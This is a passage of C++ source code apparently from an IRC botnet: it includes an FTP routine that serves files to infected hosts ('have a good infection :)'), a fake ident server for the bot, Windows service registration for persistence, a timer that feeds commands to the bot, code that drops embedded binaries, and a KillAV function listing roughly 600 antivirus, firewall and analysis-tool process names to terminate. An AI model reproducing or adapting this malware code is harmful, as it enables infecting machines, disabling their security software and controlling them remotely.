						"CSendFileFTP(0x%8.8Xh): Transfer to %d.%d.%d.%d finished.", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
							(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#ifdef DBGCONSOLE
				g_pMainCtrl->m_cConsDbg.Log(5, "CSendFileFTP(0x%8.8Xh): Transfer to %d.%d.%d.%d finished.\n", this, (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
						(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
#endif
				fclose(fp); sSendSocket.Disconnect(); }

			char *szComplete="226 Transfer complete.\r\n";
			sClientSocket.Write(szComplete, strlen(szComplete));

			sClientSocket.RecvLineIRC(szRecvBuf, sizeof(szRecvBuf));
			char *szGoodbye="221 Goodbye, have a good infection :).\r\n";
			sClientSocket.Write(szGoodbye, strlen(szGoodbye));

			sClientSocket.Disconnect();

			Sleep(2500); }

		m_sListenSocket.Disconnect();
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
	}

	return NULL;
}

void *CIdentD::Run()
{	CSocket m_sListenSocket, sClientSocket; char ibuff[64];

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "CIdentD(0x%8.8Xh): Binding IdentD to port 113.\n", this);
#endif

	if(!m_sListenSocket.Bind(113)) {
		g_pMainCtrl->m_bIdentD_Running = false;
		return NULL; }

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "CIdentD(0x%8.8Xh): Listening on port 113.\n", this);
#endif

	g_pMainCtrl->m_bIdentD_Running=true;

	while(!g_pMainCtrl->m_cBot.m_bJoined && g_pMainCtrl->m_bRunning) {
		sockaddr_in cAddr; if(m_sListenSocket.Accept(sClientSocket, &cAddr)) {
#ifdef DBGCONSOLE
			g_pMainCtrl->m_cConsDbg.Log(5, "CIdentD(0x%8.8Xh): Connection from %s accepted.\n", this, inet_ntoa(to_in_addr(cAddr.sin_addr.s_addr)));
#endif

			CString sIdentD; init_random();
			int nl=(rand()%3)+10; sIdentD.Assign("");
			for(int n=0;n<nl;n++)
			{	CString sTemp; sTemp.Assign(sIdentD);
			sIdentD.Format("%s%c", sTemp.CStr(), (rand()%26)+97); }
			
			sIdentD[10] = 0;

			memset(ibuff, 0, sizeof(ibuff));
			sprintf(ibuff, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, 113, sIdentD.CStr()); // build ident reply
			sClientSocket.Write((char*)ibuff, sizeof(ibuff)); // identd string

			sClientSocket.Disconnect(); }
		else
		{	Sleep(2000); return NULL; }

		m_sListenSocket.Disconnect();
		g_pMainCtrl->m_bIdentD_Running = false;
		break;
	}

	sClientSocket.Disconnect();

	return NULL;
}

#ifdef WIN32

VOID WINAPI ServiceStart(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD opcode);

SERVICE_STATUS			ServiceStatus;
SERVICE_STATUS_HANDLE	ServiceStatusHandle;

CService *g_cService;

void WINAPI ServiceCtrlHandler(DWORD Opcode) {
	switch(Opcode) {
	case SERVICE_CONTROL_STOP:
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Got stop opcode.\n");
#endif
		ServiceStatus.dwWin32ExitCode		= 0;
		ServiceStatus.dwCurrentState		= SERVICE_STOPPED;
		ServiceStatus.dwCheckPoint			= 0;
		ServiceStatus.dwWaitHint			= 0;
		g_pMainCtrl->m_bRunning=false;
		break;

	case SERVICE_CONTROL_INTERROGATE:
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Got interrogate opcode.\n");
#endif
		break;
	default:
#ifdef DBGCONSOLE
		g_pMainCtrl->m_cConsDbg.Log(3, "ServiceCtrlHandler(utility.cpp): Unknown value %d\n", Opcode);
#endif
		break; }
	
#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Setting service to running...\n");
#endif
	ServiceStatus.dwCurrentState			= SERVICE_RUNNING;
	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "ServiceCtrlHandler(utility.cpp): Finished handler.\n");
#endif
	return; }

/*
	This function starts the service
*/

void WINAPI ServiceStart(DWORD argc, LPTSTR *argv) {
	DWORD status; DWORD specificError;

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "ServiceStart(utility.cpp): Starting up service...\n");
#endif

	ServiceStatus.dwServiceType				=	SERVICE_WIN32_SHARE_PROCESS;
	ServiceStatus.dwCurrentState			=	SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted		=	SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwWin32ExitCode			=	0;
	ServiceStatus.dwServiceSpecificExitCode	=	0;
	ServiceStatus.dwCheckPoint				=	0;
	ServiceStatus.dwWaitHint				=	0;
	
#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "ServiceStart(utility.cpp): Registering service handler...\n");
#endif
	ServiceStatusHandle=RegisterServiceCtrlHandler(g_pMainCtrl->m_cBot.as_service_name.sValue.CStr(), ServiceCtrlHandler);
	
	if(ServiceStatusHandle==(SERVICE_STATUS_HANDLE)0) return;

	ServiceStatus.dwCurrentState			=	SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint				=	0;
	ServiceStatus.dwWaitHint				=	0;

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "ServiceStart(utility.cpp): Setting service to running...\n");
#endif
	if(!SetServiceStatus(ServiceStatusHandle, &ServiceStatus)) return;

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "ServiceStart(utility.cpp): Finished Initialization.\n");
#endif
	return; }

CService::CService() { m_szType="CService"; }

void *CService::Run() {
	g_cService=this; char as_service_name[256];

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "CService::CService(utility.cpp): Starting service...\n");
#endif

	strncpy(as_service_name, g_pMainCtrl->m_cBot.as_service_name.sValue.CStr(), sizeof(as_service_name));

	SERVICE_TABLE_ENTRY DispatchTable[]= {
		{	as_service_name,	ServiceStart	},
		{	NULL,				NULL			} };

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "CService::CService(utility.cpp): Starting service control dispatcher...\n");
#endif

	if(!StartServiceCtrlDispatcher(DispatchTable)) {
#ifdef DBGCONSOLE
		DWORD dwError=GetLastError();
		switch(dwError) {
		case ERROR_FAILED_SERVICE_CONTROLLER_CONNECT:
			g_pMainCtrl->m_cConsDbg.Log(3, "CService::CService(utility.cpp): StartServiceCtrlDispatcher(): Failed to connect to service controller.\n");
			break;
		case ERROR_INVALID_DATA:
			g_pMainCtrl->m_cConsDbg.Log(3, "CService::CService(utility.cpp): StartServiceCtrlDispatcher(): Invalid data.\n");
			break;
		case ERROR_SERVICE_ALREADY_RUNNING:
			g_pMainCtrl->m_cConsDbg.Log(3, "CService::CService(utility.cpp): StartServiceCtrlDispatcher(): Service already running.\n");
			break;
		}
#endif
	}

#ifdef DBGCONSOLE
	g_pMainCtrl->m_cConsDbg.Log(5, "CService::CService(utility.cpp): Finished.\n");
#endif

	return NULL; }

#endif // WIN32

CCommandInterval::CCommandInterval() {
	m_szType="CCommandInterval";
	m_iInterval=60; // Default to 60 seconds interval
}

CCommandInterval::~CCommandInterval() {
}

void *CCommandInterval::Run() {
	while(g_pMainCtrl->m_bRunning) {
		CMessage mFakeMsg;

		mFakeMsg.bNotice=false; mFakeMsg.bSilent=true;
		mFakeMsg.sChatString=m_sCommand;
		mFakeMsg.sCmd.Assign(mFakeMsg.sChatString.Token(0, " ").Mid(1));
		mFakeMsg.sDest.Assign(g_pMainCtrl->m_cBot.si_mainchan.sValue);
		mFakeMsg.sHost.Assign("CommandInterval.Net");
		mFakeMsg.sIdentd.Assign("CommandInterval");
		mFakeMsg.sReplyTo.Assign(g_pMainCtrl->m_cBot.si_mainchan.sValue);
		mFakeMsg.sSrc.Assign("CommandInterval");

		g_pMainCtrl->m_cBot.HandleMsgInt(&mFakeMsg);
		
		Sleep(m_iInterval*1000); // Sleep for specified interval
	}
	return NULL;
}

#ifdef WIN32
bool WriteFile(const char *filename, int resnum, LPCTSTR lpModuleName) {
	FILE *fp=fopen(filename, "wb"); if(!fp) return false;
	HMODULE hMod=GetModuleHandle(lpModuleName); if(!hMod) return false;
	HRSRC hBinary=FindResource(hMod, MAKEINTRESOURCE(resnum), TEXT("BINRES")); if(!hBinary) return false;
	HGLOBAL hGbDesc=LoadResource(hMod, hBinary); 
	DWORD dwSize=SizeofResource(hMod, hBinary); 
	PBYTE pData=(unsigned char*)LockResource(hGbDesc); 
	fwrite(pData, sizeof(unsigned char), dwSize, fp);
	fclose(fp); UnlockResource(hBinary);
	return true; }
#endif // WIN32

/*
	This kills a process
	Win32:	Uses PsApi to enum processes and terminates matching strings
	Linux:	Uses "killall -9 <process name>" to kill every instance of the process
*/

bool KillProcess(const char *szProcName) {
#ifdef WIN32
	HANDLE hProcess; DWORD aProcesses[1024], cbNeeded, cProcesses; bool bRetVal=false;
	unsigned int i; char szProcessName[MAX_PATH]; HMODULE hMod;
	if(!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return false;
	cProcesses=cbNeeded/sizeof(DWORD);
	for(i=0; i<cProcesses; i++)
	{	strcpy(szProcessName, "unknown");
		hProcess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, aProcesses[i]);
		if(hProcess)
		{	if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
			{	GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				for(int ipn=0;ipn<strlen(szProcessName);ipn++)
					*(szProcessName+i)=toupper(*(szProcessName+i));
				if(!strcmp(szProcessName, szProcName))
				{	TerminateProcess(hProcess, 0);
					bRetVal=true; } }
		CloseHandle(hProcess); } }
	return bRetVal;
#else
	CString sCmdBuf; sCmdBuf.Format("killall -q -9 %s", szProcName);
	system(sCmdBuf.CStr()); return true;
#endif // WIN32
}

/*
	This lists all processes in a std::list
*/

bool ListProcesses(std::list<CString> *lProcesses) {
#ifdef WIN32
	HANDLE hProcess; DWORD aProcesses[1024], cbNeeded, cProcesses; bool bRetVal=false;
	unsigned int i; char szProcessName[MAX_PATH]; HMODULE hMod;
	if(!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return false;
	cProcesses=cbNeeded/sizeof(DWORD);
	for(i=0; i<cProcesses; i++)
	{	strcpy(szProcessName, "unknown");
		hProcess=OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, aProcesses[i]);
		if(hProcess)
		{	
			bRetVal=true; 
			if(EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
			{	GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				lProcesses->push_back(CString(szProcessName));
			}
		CloseHandle(hProcess); } }
	return bRetVal;
#else
	CString sCmdBuf; sCmdBuf.Format("ps ax > tempfile");
	system(sCmdBuf.CStr());

	// FIXME: Parse "ps ax" output here

	DeleteFile("tempfile");
	return true;
#endif // WIN32
}

/*
	This returns the filename of the executable in the filesystem
	Win32:	uses GetModuleFilename on the currently running module
	Linux:	uses /proc/<pid>/exe which is a like to the executable image
*/

char* GetFilename(char* szFilename, size_t sBufSize)
{
#ifdef WIN32
	GetModuleFileName(GetModuleHandle(NULL), szFilename, sBufSize);
	return szFilename;
#else
	char szLinkname[64]; pid_t pSelf=getpid(); int iRet;	
	snprintf(szLinkname, sizeof(szLinkname), "/proc/%i/exe", pSelf);
	iRet=readlink(szLinkname, szFilename, sBufSize);
	if(iRet==-1) return NULL; if(iRet>=sBufSize) { errno=ERANGE; return NULL; }
	szFilename[iRet]=0; return szFilename;
#endif
}

/*
	This calculates a TCP/IP checksum
*/

#ifdef WIN32
	#define USE_ASM
#endif // WIN32

unsigned short checksum(unsigned short *buffer, int size) {
	unsigned long cksum=0;

#ifdef USE_ASM

	unsigned long lsize=size;
	char szMMBuf[8], *pMMBuf=szMMBuf;

	__asm {
		FEMMS

		MOV			ECX, lsize				// ecx=lsize;
		MOV			EDX, buffer				// edx=buffer;
		MOV			EBX, cksum				// ebx=cksum;

		CMP			ECX, 2					// size<2;
		JS			CKSUM_LOOP2				// goto loop 2

CKSUM_LOOP:

		XOR			EAX, EAX				// eax=0;
		MOV			AX, WORD PTR [EDX]		// ax=(unsigned short*)*buffer;
		ADD			EBX, EAX				// cksum+=(unsigned short*)*buffer;

		SUB			ECX, 2					// size-=2;
		ADD			EDX, 2					// buffer+=2;
		CMP			ECX, 1					// size>1;
		JG			CKSUM_LOOP				// while();

		CMP			ECX, 0					// if(!size);
		JE			CKSUM_FITS				// fits if equal

CKSUM_LOOP2:

		XOR			EAX, EAX				// eax=0;
		MOV			AL, BYTE PTR [EDX]		// al=(unsigned char*)*buffer;
		ADD			EBX, EAX				// cksum+=(unsigned char*)*buffer;

		SUB			ECX, 1					// size-=1;
		ADD			EDX, 1					// buffer+=1;
		CMP			ECX, 0					// size>0;
		JG			CKSUM_LOOP2				// while();

CKSUM_FITS:

		MOV			cksum, EBX				// cksum=ebx;

		MOV			EAX, cksum				// eax=cksum;
		SHR			EAX, 16					// eax=cksum>>16;
		MOV			EBX, cksum				// ebx=cksum;
		AND			EBX, 0xffff				// ebx=cksum&0xffff;

		ADD			EAX, EBX				// eax=(cksum>>16)+(cksum&0xffff);

		MOV			EBX, EAX				// ebx=cksum;
		SHR			EBX, 16					// ebx=cksum>>16;
		ADD			EAX, EBX				// cksum+=(cksum>>16);

		MOV			cksum, EAX				// cksum=EAX;

		FEMMS
	}

#else // USE_ASM

	while(size>1) { cksum+=*buffer++; size-=2; }
	if(size) cksum+=*(unsigned char*)buffer;

	cksum=(cksum>>16)+(cksum&0xffff);
	cksum+=(cksum>>16);

#endif // USE_ASM

	return (unsigned short)(~cksum); }

/*
	This returns a static in_addr with a host assigned
*/

in_addr &to_in_addr(unsigned long lHost)
{	static in_addr ina; ina.s_addr=lHost; return ina; }

/*
	This kills all active Antivirus processes that match
	Thanks to FSecure's Bugbear.B analysis @
	http://www.f-secure.com/v-descs/bugbear_b.shtml
*/

void KillAV()
{	
#ifdef WIN32

	// 609 filenames
	const char *szFilenamesToKill[] = {
		"ACKWIN32.EXE", "ADAWARE.EXE", "ADVXDWIN.EXE", "AGENTSVR.EXE", "AGENTW.EXE", "ALERTSVC.EXE", "ALEVIR.EXE", "ALOGSERV.EXE", 
		"AMON9X.EXE", "ANTI-TROJAN.EXE", "ANTIVIRUS.EXE", "ANTS.EXE", "APIMONITOR.EXE", "APLICA32.EXE", "APVXDWIN.EXE",
		"ARR.EXE", "ATCON.EXE", "ATGUARD.EXE", "ATRO55EN.EXE", "ATUPDATER.EXE", "ATUPDATER.EXE", "ATWATCH.EXE", "AU.EXE",
		"AUPDATE.EXE", "AUPDATE.EXE", "AUTODOWN.EXE", "AUTODOWN.EXE", "AUTOTRACE.EXE", "AUTOTRACE.EXE", "AUTOUPDATE.EXE",
		"AUTOUPDATE.EXE", "AVCONSOL.EXE", "AVE32.EXE", "AVGCC32.EXE", "AVGCTRL.EXE", "AVGNT.EXE", "AVGSERV.EXE",
		"AVGSERV9.EXE", "AVGUARD.EXE", "AVGW.EXE", "AVKPOP.EXE", "AVKSERV.EXE", "AVKSERVICE.EXE", "AVKWCTl9.EXE",
		"AVLTMAIN.EXE", "AVNT.EXE", "AVP.EXE", "AVP32.EXE", "AVPCC.EXE", "AVPDOS32.EXE", "AVPM.EXE", "AVPTC32.EXE",
		"AVPUPD.EXE", "AVPUPD.EXE", "AVSCHED32.EXE", "AVSYNMGR.EXE", "AVWIN95.EXE", "AVWINNT.EXE", "AVWUPD.EXE",
		"AVWUPD32.EXE", "AVWUPD32.EXE", "AVWUPSRV.EXE", "AVXMONITOR9X.EXE", "AVXMONITORNT.EXE", "AVXQUAR.EXE",
		"AVXQUAR.EXE", "BACKWEB.EXE", "BARGAINS.EXE", "BD_PROFESSIONAL.EXE", "BEAGLE.EXE", "BELT.EXE", "BIDEF.EXE",
		"BIDSERVER.EXE", "BIPCP.EXE", "BIPCPEVALSETUP.EXE", "BISP.EXE", "BLACKD.EXE", "BLACKICE.EXE", "BLSS.EXE",
		"BOOTCONF.EXE", "BOOTWARN.EXE", "BORG2.EXE", "BPC.EXE", "BRASIL.EXE", "BS120.EXE", "BUNDLE.EXE", "BVT.EXE",
		"CCAPP.EXE", "CCEVTMGR.EXE", "CCPXYSVC.EXE", "CDP.EXE", "CFD.EXE", "CFGWIZ.EXE", "CFIADMIN.EXE", "CFIAUDIT.EXE",
		"CFIAUDIT.EXE", "CFINET.EXE", "CFINET32.EXE", "CLAW95CF.EXE", "CLEAN.EXE", "CLEANER.EXE", "CLEANER3.EXE",
		"CLEANPC.EXE", "CLICK.EXE", "CMD32.EXE", "CMESYS.EXE", "CMGRDIAN.EXE", "CMON016.EXE", "CONNECTIONMONITOR.EXE",
		"CPD.EXE", "CPF9X206.EXE", "CPFNT206.EXE", "CTRL.EXE", "CV.EXE", "CWNB181.EXE", "CWNTDWMO.EXE", "Claw95.EXE",
		"CLAW95CF.EXE", "DATEMANAGER.EXE", "DCOMX.EXE", "DEFALERT.EXE", "DEFSCANGUI.EXE", "DEFWATCH.EXE", "DEPUTY.EXE",
		"DIVX.EXE", "DLLCACHE.EXE", "DLLREG.EXE", "DOORS.EXE", "DPF.EXE", "DPFSETUP.EXE", "DPPS2.EXE", "DRWATSON.EXE",
		"DRWEB32.EXE", "DRWEBUPW.EXE", "DSSAGENT.EXE", "DVP95.EXE", "DVP95_0.EXE", "ECENGINE.EXE", "EFPEADM.EXE",
		"EMSW.EXE", "ENT.EXE", "ESAFE.EXE", "ESCANH95.EXE", "ESCANHNT.EXE", "ESCANV95.EXE", "ESPWATCH.EXE", "ETHEREAL.EXE",
		"ETRUSTCIPE.EXE", "EVPN.EXE", "EXANTIVIRUS-CNET.EXE", "EXE.AVXW.EXE", "EXPERT.EXE", "EXPLORE.EXE",
		"F-AGNT95.EXE", "F-PROT.EXE", "F-PROT95.EXE", "F-STOPW.EXE", "FAMEH32.EXE", "FAST.EXE", "FCH32.EXE", "FIH32.EXE",
		"FINDVIRU.EXE", "FIREWALL.EXE", "FLOWPROTECTOR.EXE", "FNRB32.EXE", "FP-WIN.EXE", "FP-WIN_TRIAL.EXE",
		"FPROT.EXE", "FRW.EXE", "FSAA.EXE", "FSAV.EXE", "FSAV32.EXE", "FSAV530STBYB.EXE", "FSAV530WTBYB.EXE", "FSAV95.EXE",
		"FSGK32.EXE", "FSM32.EXE", "FSMA32.EXE", "FSMB32.EXE", "GATOR.EXE", "GBMENU.EXE", "GBPOLL.EXE", "GENERICS.EXE",
		"GMT.EXE", "GUARD.EXE", "GUARDDOG.EXE", "HACKTRACERSETUP.EXE", "HBINST.EXE", "HBSRV.EXE", "HOTACTIO.EXE",
		"HOTPATCH.EXE", "HTLOG.EXE", "HTPATCH.EXE", "HWPE.EXE", "HXDL.EXE", "HXIUL.EXE", "IAMAPP.EXE", "IAMSERV.EXE",
		"IAMSTATS.EXE", "IBMASN.EXE", "IBMAVSP.EXE", "ICLOAD95.EXE", "ICLOADNT.EXE", "ICMON.EXE", "ICSUPP95.EXE",
		"ICSUPP95.EXE", "ICSUPPNT.EXE", "IDLE.EXE", "IEDLL.EXE", "IEDRIVER.EXE", "IEXPLORER.EXE", "IFACE.EXE",
		"IFW2000.EXE", "INETLNFO.EXE", "INFUS.EXE", "INFWIN.EXE", "INIT.EXE", "INTDEL.EXE", "INTREN.EXE", "IOMON98.EXE",
		"IPARMOR.EXE", "IRIS.EXE", "ISASS.EXE", "ISRV95.EXE", "ISTSVC.EXE", "JAMMER.EXE", "JDBGMRG.EXE", "JEDI.EXE",
		"KAVLITE40ENG.EXE", "KAVPERS40ENG.EXE", "KAVPF.EXE", "KAZZA.EXE", "KEENVALUE.EXE", "KERIO-PF-213-EN-WIN.EXE",
		"KERIO-WRL-421-EN-WIN.EXE", "KERIO-WRP-421-EN-WIN.EXE", "KERNEL32.EXE", "KILLPROCESSSETUP161.EXE",
		"LAUNCHER.EXE", "LDNETMON.EXE", "LDPRO.EXE", "LDPROMENU.EXE", "LDSCAN.EXE", "LNETINFO.EXE", "LOADER.EXE",
		"LOCALNET.EXE", "LOCKDOWN.EXE", "LOCKDOWN2000.EXE", "LOOKOUT.EXE", "LORDPE.EXE", "LSETUP.EXE", "LUALL.EXE",
		"LUALL.EXE", "LUAU.EXE", "LUCOMSERVER.EXE", "LUINIT.EXE", "LUSPT.EXE", "MAPISVC32.EXE", "MCAGENT.EXE", "MCMNHDLR.EXE",
		"MCSHIELD.EXE", "MCTOOL.EXE", "MCUPDATE.EXE", "MCUPDATE.EXE", "MCVSRTE.EXE", "MCVSSHLD.EXE", "MD.EXE", "MFIN32.EXE",
		"MFW2EN.EXE", "MFWENG3.02D30.EXE", "MGAVRTCL.EXE", "MGAVRTE.EXE", "MGHTML.EXE", "MGUI.EXE", "MINILOG.EXE",
		"MMOD.EXE", "MONITOR.EXE", "MOOLIVE.EXE", "MOSTAT.EXE", "MPFAGENT.EXE", "MPFSERVICE.EXE", "MPFTRAY.EXE",
		"MRFLUX.EXE", "MSAPP.EXE", "MSBB.EXE", "MSBLAST.EXE", "MSCACHE.EXE", "MSCCN32.EXE", "MSCMAN.EXE", "MSCONFIG.EXE",
		"MSDM.EXE", "MSDOS.EXE", "MSIEXEC16.EXE", "MSINFO32.EXE", "MSLAUGH.EXE", "MSMGT.EXE", "MSMSGRI32.EXE",
		"MSSMMC32.EXE", "MSSYS.EXE", "MSVXD.EXE", "MU0311AD.EXE", "MWATCH.EXE", "N32SCANW.EXE", "NAV.EXE",
		"AUTO-PROTECT.NAV80TRY.EXE", "NAVAP.NAVAPSVC.EXE", "NAVAPSVC.EXE", "NAVAPW32.EXE", "NAVDX.EXE",
		"NAVENGNAVEX15.NAVLU32.EXE", "NAVLU32.EXE", "NAVNT.EXE", "NAVSTUB.EXE", "NAVW32.EXE", "NAVWNT.EXE",
		"NC2000.EXE", "NCINST4.EXE", "NDD32.EXE", "NEOMONITOR.EXE", "NEOWATCHLOG.EXE", "NETARMOR.EXE", "NETD32.EXE",
		"NETINFO.EXE", "NETMON.EXE", "NETSCANPRO.EXE", "NETSPYHUNTER-1.2.EXE", "NETSTAT.EXE", "NETUTILS.EXE",
		"NISSERV.EXE", "NISUM.EXE", "NMAIN.EXE", "NOD32.EXE", "NORMIST.EXE", "NORTON_INTERNET_SECU_3.0_407.EXE",
		"NOTSTART.EXE", "NPF40_TW_98_NT_ME_2K.EXE", "NPFMESSENGER.EXE", "NPROTECT.EXE", "NPSCHECK.EXE",
		"NPSSVC.EXE", "NSCHED32.EXE", "NSSYS32.EXE", "NSTASK32.EXE", "NSUPDATE.EXE", "NT.EXE", "NTRTSCAN.EXE", "NTVDM.EXE",
		"NTXconfig.EXE", "NUI.EXE", "NUPGRADE.EXE", "NUPGRADE.EXE", "NVARCH16.EXE", "NVC95.EXE", "NVSVC32.EXE",
		"NWINST4.EXE", "NWSERVICE.EXE", "NWTOOL16.EXE", "OLLYDBG.EXE", "ONSRVR.EXE", "OPTIMIZE.EXE", "OSTRONET.EXE",
		"OTFIX.EXE", "OUTPOST.EXE", "OUTPOST.EXE", "OUTPOSTINSTALL.EXE", "OUTPOSTPROINSTALL.EXE", "PADMIN.EXE",
		"PANIXK.EXE", "PATCH.EXE", "PAVCL.EXE", "PAVPROXY.EXE", "PAVSCHED.EXE", "PAVW.EXE", "PCC2002S902.EXE",
		"PCC2K_76_1436.EXE", "PCCIOMON.EXE", "PCCNTMON.EXE", "PCCWIN97.EXE", "PCCWIN98.EXE", "PCDSETUP.EXE",
		"PCFWALLICON.EXE", "PCIP10117_0.EXE", "PCSCAN.EXE", "PDSETUP.EXE", "PENIS.EXE", "PERISCOPE.EXE", "PERSFW.EXE",
		"PERSWF.EXE", "PF2.EXE", "PFWADMIN.EXE", "PGMONITR.EXE", "PINGSCAN.EXE", "PLATIN.EXE", "POP3TRAP.EXE", "POPROXY.EXE",
		"POPSCAN.EXE", "PORTDETECTIVE.EXE", "PORTMONITOR.EXE", "POWERSCAN.EXE", "PPINUPDT.EXE", "PPTBC.EXE",
		"PPVSTOP.EXE", "PRIZESURFER.EXE", "PRMT.EXE", "PRMVR.EXE", "PROCDUMP.EXE", "PROCESSMONITOR.EXE",
		"PROCEXPLORERV1.0.EXE", "PROGRAMAUDITOR.EXE", "PROPORT.EXE", "PROTECTX.EXE", "PSPF.EXE", "PURGE.EXE",
		"PUSSY.EXE", "PVIEW95.EXE", "QCONSOLE.EXE", "QSERVER.EXE", "RAPAPP.EXE", "RAV7.EXE", "RAV7WIN.EXE",
		"RAV8WIN32ENG.EXE", "RAY.EXE", "RB32.EXE", "RCSYNC.EXE", "REALMON.EXE", "REGED.EXE", "REGEDIT.EXE", "REGEDT32.EXE",
		"RESCUE.EXE", "RESCUE32.EXE", "RRGUARD.EXE", "RSHELL.EXE", "RTVSCAN.EXE", "RTVSCN95.EXE", "RULAUNCH.EXE",
		"RUN32DLL.EXE", "RUNDLL16.EXE", "RUXDLL32.EXE", "SAFEWEB.EXE", "SAHAGENT.EXE", "SAVE.EXE",
		"SAVENOW.EXE", "SBSERV.EXE", "SC.EXE", "SCAM32.EXE", "SCAN32.EXE", "SCAN95.EXE", "SCANPM.EXE", "SCRSCAN.EXE",
		"SCRSVR.EXE", "SCVHOST.EXE", "SD.EXE", "SERV95.EXE", "SERVICE.EXE", "SERVLCE.EXE", "SERVLCES.EXE",
		"SETUPVAMEEVAL.EXE", "SETUP_FLOWPROTECTOR_US.EXE", "SFC.EXE", "SGSSFW32.EXE", "SH.EXE",
		"SHELLSPYINSTALL.EXE", "SHN.EXE", "SHOWBEHIND.EXE", "SMC.EXE", "SMS.EXE", "SMSS32.EXE", "SOAP.EXE", "SOFI.EXE",
		"SPERM.EXE", "SPF.EXE", "SPHINX.EXE", "SPOLER.EXE", "SPOOLCV.EXE", "SPOOLSV32.EXE", "SPYXX.EXE", "SREXE.EXE",
		"SRNG.EXE", "SS3EDIT.EXE", "SSGRATE.EXE", "SSG_4104.EXE", "ST2.EXE", "START.EXE", "STCLOADER.EXE", "SUPFTRL.EXE",
		"SUPPORT.EXE", "SUPPORTER5.EXE", "SVC.EXE", "SVCHOSTC.EXE", "SVCHOSTS.EXE", "SVSHOST.EXE", "SWEEP95.EXE",
		"SWEEPNET.SWEEPSRV.SYS.SWNETSUP.EXE", "SYMPROXYSVC.EXE", "SYMTRAY.EXE", "SYSEDIT.EXE", "SYSTEM.EXE",
		"SYSTEM32.EXE", "SYSUPD.EXE", "TASKMG.EXE", "TASKMO.EXE", "TASKMON.EXE", "TAUMON.EXE", "TBSCAN.EXE", "TC.EXE",
		"TCA.EXE", "TCM.EXE", "TDS-3.EXE", "TDS2-98.EXE", "TDS2-NT.EXE", "TEEKIDS.EXE", "TFAK.EXE", "TFAK5.EXE", "TGBOB.EXE",
		"TITANIN.EXE", "TITANINXP.EXE", "TRACERT.EXE", "TRICKLER.EXE", "TRJSCAN.EXE", "TRJSETUP.EXE", "TROJANTRAP3.EXE",
		"TSADBOT.EXE", "TVMD.EXE", "TVTMD.EXE", "UNDOBOOT.EXE", "UPDAT.EXE", "UPDATE.EXE", "UPDATE.EXE", "UPGRAD.EXE",
		"UTPOST.EXE", "VBCMSERV.EXE", "VBCONS.EXE", "VBUST.EXE", "VBWIN9X.EXE", "VBWINNTW.EXE", "VCSETUP.EXE", "VET32.EXE",
		"VET95.EXE", "VETTRAY.EXE", "VFSETUP.EXE", "VIR-HELP.EXE", "VIRUSMDPERSONALFIREWALL.EXE", "VNLAN300.EXE",
		"VNPC3000.EXE", "VPC32.EXE", "VPC42.EXE", "VPFW30S.EXE", "VPTRAY.EXE", "VSCAN40.EXE", "VSCENU6.02D30.EXE",
		"VSCHED.EXE", "VSECOMR.EXE", "VSHWIN32.EXE", "VSISETUP.EXE", "VSMAIN.EXE", "VSMON.EXE", "VSSTAT.EXE",
		"VSWIN9XE.EXE", "VSWINNTSE.EXE", "VSWINPERSE.EXE", "W32DSM89.EXE", "W9X.EXE", "WATCHDOG.EXE", "WEBDAV.EXE",
		"WEBSCANX.EXE", "WEBTRAP.EXE", "WFINDV32.EXE", "WGFE95.EXE", "WHOSWATCHINGME.EXE", "WIMMUN32.EXE",
		"WIN-BUGSFIX.EXE", "WIN32.EXE", "WIN32US.EXE", "WINACTIVE.EXE", "WINDOW.EXE", "WINDOWS.EXE", "WININETD.EXE",
		"WININIT.EXE", "WININITX.EXE", "WINLOGIN.EXE", "WINMAIN.EXE", "WINNET.EXE", "WINPPR32.EXE", "WINRECON.EXE",
		"WINSERVN.EXE", "WINSSK32.EXE", "WINSTART.EXE", "WINSTART001.EXE", "WINTSK32.EXE", "WINUPDATE.EXE",
		"WKUFIND.EXE", "WNAD.EXE", "WNT.EXE", "WRADMIN.EXE", "WRCTRL.EXE", "WSBGATE.EXE", "WUPDATER.EXE", "WUPDT.EXE",
		"WYVERNWORKSFIREWALL.EXE", "XPF202EN.EXE", "ZAPRO.EXE", "ZAPSETUP3001.EXE", "ZATUTOR.EXE", "ZONALM2601.EXE",
		"ZONEALARM.EXE", "_AVP32.EXE", "_AVPCC.EXE", "_AVPM.EXE", NULL };

